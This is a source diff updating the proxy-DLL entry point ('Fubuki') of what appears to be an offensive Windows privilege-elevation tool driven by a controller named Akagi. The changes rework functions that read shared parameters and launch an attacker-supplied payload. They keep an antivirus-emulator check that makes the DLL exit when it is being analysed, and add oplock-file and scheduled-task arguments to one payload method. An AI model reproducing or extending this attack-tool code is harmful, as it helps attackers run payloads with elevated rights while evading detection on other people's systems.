@@ -1,12 +1,12 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2014 - 2025
+*  (C) COPYRIGHT AUTHORS, 2014 - 2026
 *
 *  TITLE:       DLLMAIN.C
 *
-*  VERSION:     3.69
+*  VERSION:     3.71
 *
-*  DATE:        07 Jul 2025
+*  DATE:        21 Jul 2026
 *
 *  Proxy dll entry point.
 *
@@ -53,7 +53,7 @@ VOID DefaultPayload(
     PWSTR lpParameter;
     ULONG cbParameter;
 
-    ucmDbgMsg(LoadedMsg);
+    ucmLogDbgMsg(FubukiLoadedMsg);
 
     //
     // Read shared params block.
@@ -61,31 +61,31 @@ VOID DefaultPayload(
     RtlSecureZeroMemory(&g_SharedParams, sizeof(g_SharedParams));
     bSharedParamsReadOk = ucmReadSharedParameters(&g_SharedParams);
     if (bSharedParamsReadOk) {
-        ucmDbgMsg(L"Fubuki, ucmReadSharedParameters OK\r\n");
+        ucmLogDbgMsg(L"[Fubuki] ucmReadSharedParameters OK\r\n");
 
         lpParameter = g_SharedParams.szParameter;
         cbParameter = (ULONG)(_strlen(g_SharedParams.szParameter) * sizeof(WCHAR));
     }
     else {
-        ucmDbgMsg(L"Fubuki, ucmReadSharedParameters Failed\r\n");
+        ucmLogDbgMsg(L"[Fubuki] ucmReadSharedParameters Failed\r\n");
         lpParameter = NULL;
         cbParameter = 0UL;
     }
 
-    ucmDbgMsg(L"Fubuki, before ucmLaunchPayload\r\n");
+    ucmLogDbgMsg(L"[Fubuki] Before ucmLaunchPayload\r\n");
 
     ExitCode = (ucmLaunchPayload(lpParameter, cbParameter) != FALSE);
 
-    ucmDbgMsg(L"Fubuki, after ucmLaunchPayload\r\n");
+    ucmLogDbgMsg(L"[Fubuki] After ucmLaunchPayload\r\n");
     if (ExitCode == 0) {
-        ucmDbgMsg(L"Fubuki, ucmLaunchPayload failed\r\n");
+        ucmLogDbgMsg(L"[Fubuki] ucmLaunchPayload failed\r\n");
     }
 
     //
     // If this is default executable, show runtime info.
     //
     if ((lpParameter == NULL) || (cbParameter == 0)) {
-        if (g_SharedParams.AkagiFlag == AKAGI_FLAG_TANGO)
+        if (g_SharedParams.QueryRuntimeInformation)
             ucmQueryRuntimeInfo(FALSE);
     }
 
@@ -93,7 +93,7 @@ VOID DefaultPayload(
     // Notify Akagi.
     //
     if (bSharedParamsReadOk) {
-        ucmDbgMsg(L"Fubuki, completion\r\n");
+        ucmLogDbgMsg(L"[Fubuki] Akagi notification\r\n");
         ucmSetCompletion(g_SharedParams.szSignalObject);
     }
 
@@ -331,7 +331,7 @@ BOOL WINAPI EntryPointSxsConsent(
 
     UNREFERENCED_PARAMETER(lpvReserved);
 
-    ucmDbgMsg(LoadedMsg);
+    ucmLogDbgMsg(FubukiLoadedMsg);
 
     if (wdIsEmulatorPresent() != STATUS_NOT_SUPPORTED)
         RtlExitUserProcess('foff');
@@ -372,26 +372,26 @@ BOOL WINAPI EntryPointSxsConsent(
 }
 
 /*
-* EntryPointBackupLocked
+* EntryPointR41N3RZUF477
 *
 * Purpose:
 *
-* Entry point to be used by QuickAssist method.
+* Entry point to be used by R41N3RZUF477 methods.
 *
 */
-BOOL WINAPI EntryPointBackupLocked(
+BOOL WINAPI EntryPointR41N3RZUF477(
     _In_ HINSTANCE hinstDLL,
     _In_ DWORD fdwReason,
     _In_ LPVOID lpvReserved
 )
 {
     BOOL bSharedParamsReadOk;
-    PWSTR lpParameter;
+    PWSTR lpParameter, lpOpLockFile = NULL, lpTask = NULL;
     ULONG cbParameter;
 
     UNREFERENCED_PARAMETER(lpvReserved);
 
-    ucmDbgMsg(LoadedMsg);
+    ucmLogDbgMsg(FubukiLoadedMsg);
 
     if (wdIsEmulatorPresent() != STATUS_NOT_SUPPORTED)
         RtlExitUserProcess('foff');
@@ -409,13 +409,20 @@ BOOL WINAPI EntryPointBackupLocked(
         if (bSharedParamsReadOk) {
             lpParameter = g_SharedParams.szParameter;
             cbParameter = (ULONG)(_strlen(g_SharedParams.szParameter) * sizeof(WCHAR));
+            if (g_SharedParams.szOptionalParameter1[0] != 0)
+                lpOpLockFile = g_SharedParams.szOptionalParameter1;
+            if (g_SharedParams.szOptionalParameter2[0] != 0)
+                lpTask = g_SharedParams.szOptionalParameter2;
         }
         else {
             lpParameter = NULL;
             cbParameter = 0UL;
         }
 
-        ucmLaunchPayload3(lpParameter, cbParameter);
+        if (lpTask && lpOpLockFile) {
+            ucmLogDbgMsg(L"[Fubuki] Before ucmLaunchPayload3\r\n");
+            ucmLaunchPayload3(g_SharedParams.MethodId, lpParameter, cbParameter, lpOpLockFile, lpTask);
+        }
 
         //
         // Notify Akagi.
